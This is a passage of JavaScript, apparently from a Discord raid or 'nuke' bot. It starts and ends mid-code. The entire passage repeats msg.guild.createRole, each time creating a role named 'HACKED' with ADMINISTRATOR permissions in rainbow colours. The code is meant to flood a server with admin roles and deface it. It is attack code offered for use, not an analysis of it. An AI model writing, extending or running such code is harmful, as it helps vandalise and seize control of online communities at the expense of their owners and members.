      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",  
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    }); msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",  
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    }); msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",  
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    }); msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",  
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    }); msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",  
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    }); msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",  
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    }); msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",  
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    }); msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
